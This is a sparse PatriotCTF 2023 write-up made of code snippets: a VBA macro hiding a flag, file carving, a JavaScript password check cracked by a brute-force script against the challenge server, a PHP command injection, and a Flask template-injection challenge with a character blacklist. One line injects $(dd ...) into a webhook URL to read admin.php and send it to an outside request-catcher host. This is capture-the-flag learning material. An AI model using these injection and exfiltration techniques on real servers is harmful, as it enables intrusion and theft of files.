# PatriotCTF 2023 Writeup

> 原文: https://www.ctfiot.com/134358.html
> ID: 134358


```
Dim x51 As String
 Dim x49 As String

 x51 = "C:\Program Files\Internet Explorer\iexplore.exe"

 Dim x50 As Integer
 Dim x47 As Double
 For x50 = 1 To 100
 x47 = Sqr(x50) * 2 + 5 / x50
 Next x50

 MsgBox "cYvSGF9cFrrEmfYFW8Yo", vbInformation, "aThg"

 x49 = [char]0x50 + [char]0x43 + [char]0x54 + [char]0x46 + [char]0x7B + [char]0x33 + [char]0x6E + [char]0x34 + [char]0x62 + [char]0x6C + [char]0x33 + [char]0x5F + [char]0x6D + [char]0x34 + [char]0x63 + [char]0x72 + [char]0x30 + [char]0x35 + [char]0x5F + [char]0x70 + [char]0x6C + [char]0x7A + [char]0x5F + [char]0x32 + [char]0x37 + [char]0x33 + [char]0x31 + [char]0x35 + [char]0x36 + [char]0x37 + [char]0x30 + [char]0x7D

 Shell x51 & " " & x49, vbNormalFocus

 Application.Wait Now + TimeValue("00:00:02")

 MsgBox "sgTdrn8Np2Kpfnmr9y57" & x49, vbInformation, "foSds"

 Dim x45(1 To 10) As Integer
 Dim x46 As Integer
 For x50 = 1 To 10
 x46 = Int((100 - 1 + 1) * Rnd + 1)
 x45(x50) = x46
 Next x50

 Dim x52 As Integer
 Dim x53 As Integer
 For x50 = 1 To 9
 For x53 = x50 + 1 To 10
 If x45(x50) > x45(x53) Then
 x52 = x45(x50)
 x45(x50) = x45(x53)
 x45(x53) = x52
 End If
 Next x53
 Next x50

 Dim x54 As String
 For x50 = 1 To 10
 x54 = x54 & x45(x50) & ", "
 Next x50
 MsgBox "phNuYUNwdHHCJdVL4hJd" & Left(x54, Len(x54) - 2), vbInformation, "LOEC"

 Dim x55 As Worksheet
 Set x55 = ThisWorkbook.Sheets.Add(After:=ThisWorkbook.Sheets(ThisWorkbook.Sheets.Count))
 x55.Name = "TtrZ4"
 Dim x56 As ChartObject
 Set x56 = x55.ChartObjects.Add(Left:=10, Top:=10, Width:=300, Height:=200)

 Dim x57 As Range
 Set x57 = x55.Range("A1:B5")
 x57.Value = Application.WorksheetFunction.RandBetween(1, 100)
 x56.Chart.SetSourceData Source:=x57
 x56.Chart.ChartType = xlColumnClustered

 Exit Sub

ErrorHandler:
 MsgBox "hWgjD9NKf7UqXdAq0GBb", vbCritical, "uv9b"
End Sub
```



```
x49 = [char]0x50 + [char]0x43 + [char]0x54 + [char]0x46 + [char]0x7B + [char]0x33 + [char]0x6E + [char]0x34 + [char]0x62 + [char]0x6C + [char]0x33 + [char]0x5F + [char]0x6D + [char]0x34 + [char]0x63 + [char]0x72 + [char]0x30 + [char]0x35 + [char]0x5F + [char]0x70 + [char]0x6C + [char]0x7A + [char]0x5F + [char]0x32 + [char]0x37 + [char]0x33 + [char]0x31 + [char]0x35 + [char]0x36 + [char]0x37 + [char]0x30 + [char]0x7D
```



```
$ binwalk -e capybara.jpeg 

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
0 0x0 JPEG image data, JFIF standard 1.01
151174 0x24E86 Zip archive data, at least v2.0 to extract, compressed size: 6902, uncompressed size: 919160, name: audio.wav
158170 0x269DA End of Zip archive, footer length: 22
```



```
function checkName(name){

 var check = name.split("").reverse().join("");
 return check === "uyjnimda" ? !0 : !1;
}
```



```
function checkLength(pwd){
 return (password.length % 6 === 0 )? !0:!1;
 }
function checkValidity(password){
 const arr = Array.from(password).map(ok);
 function ok(e){
 if (e.charCodeAt(0)<= 122 && e.charCodeAt(0) >=97 ){
 return e.charCodeAt(0);
 }}

 let sum = 0;
 for (let i = 0; i < arr.length; i+=6){
 var add = arr[i] & arr[i + 2]; 
 var or = arr[i + 1] | arr[i + 4]; 
 var xor = arr[i + 3] ^ arr[i + 5];
 if (add === 0x60 && or === 0x61 && xor === 0x6) sum += add + or - xor; 
 }
 return sum === 0xbb ? !0 : !1;
}
```



```
$ python3 -c "print(0x60+0x61-0x6);print(0xbb)"
187
187
```



```
import time
import requests

for v0 in range(97,122 + 1):
 for v1 in range(97,122 + 1):
 for v2 in range(97,122 + 1):
 for v3 in range(97,122 + 1):
 for v4 in range(97,122 + 1):
 for v5 in range(97,122 + 1):
 if (v0 & v2) == 0x60 and (v1 | v4) == 0x61 and (v3 ^ v5) == 0x6:
 passwd = chr(v0) + chr(v1) + chr(v2) + chr(v3) + chr(v4) + chr(v5)
 print(passwd)
 t = requests.post('http://chal.pctf.competitivecyber.club:9096/check.php', data={'password':passwd}).text
 if 'incorrect password' not in t:
 print(t)
 print('did it!')
 exit(0)
 time.sleep(0.1)
```



```
exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");
```



```
if (!filter_var($this->wh, FILTER_VALIDATE_URL)) {
 header("location: ../login.php?error=NotValidWebhook");
 exit();
 }
```



```
http://[yours].requestcatcher.com/test?q=$(dd${IFS}if=/var/www/html/admin.php${IFS}bs=1${IFS}skip=325)
```



```
[]
config
|
__builtins__
"
'
+
```



```
from flask import Flask, render_template, render_template_string

app = Flask(__name__)
app.static_folder = 'static'

starter_pokemon = {
 "charmander" : {
 "name": "Charmander",
 "type": "Fire",
 "abilities": ["Blaze", "Solar Power"],
 "height": "0.6m",
 "weight": "8.5 kg",
 "description": "Charmander is a Fire-type Pokémon known for its burning tail flame.",
 "picture": "https://assets.pokemon.com/assets/cms2/img/pokedex/full/004.png"
 },
 "bulbasaur" : {
 "name": "Bulbasaur",
 "type": "Grass/Poison",
 "abilities": ["Overgrow", "Chlorophyll"],
 "height": "0.7m",
 "weight": "6.9 kg",
 "description": "Bulbasaur is a dual-type Grass/Poison Pokémon known for the plant bulb on its back.",
 "picture": "https://archives.bulbagarden.net/media/upload/f/fb/0001Bulbasaur.png"
 },
 "squirtle" : {
 "name": "Squirtle",
 "type": "Water",
 "abilities": ["Torrent", "Rain Dish"],
 "height": "0.5m",
 "weight": "9.0 kg",
 "description": "Squirtle is a Water-type Pokémon known for its water cannons on its back.",
 "picture": "https://static.pokemonpets.com/images/monsters-images-800-800/7-Squirtle.webp"
 },
}

def blacklist(string):
 block = ["config", "update", "builtins", "\"", "'", "`", "|", " ", "[", "]", "+", "-"]
 
 for item in block:
 if item in string:
 return True
 return False

@app.route('/')
def index():
 render = render_template('index.html')
 return render_template_string(render)

@app.route('/<pokemon>')
def detail(pokemon):
 pokemon = pokemon.lower()
 try:
 render = render_template('pokemon_name.html', data=starter_pokemon[pokemon])
 return render_template_string(render)
 except:
 if blacklist(pokemon):
 return render_template('error.html')
 
 render = render_template('404.html', pokemon=pokemon)
 return render_template_string(render)

if __name__ == '__main__':
 app.run(debug=True)
```
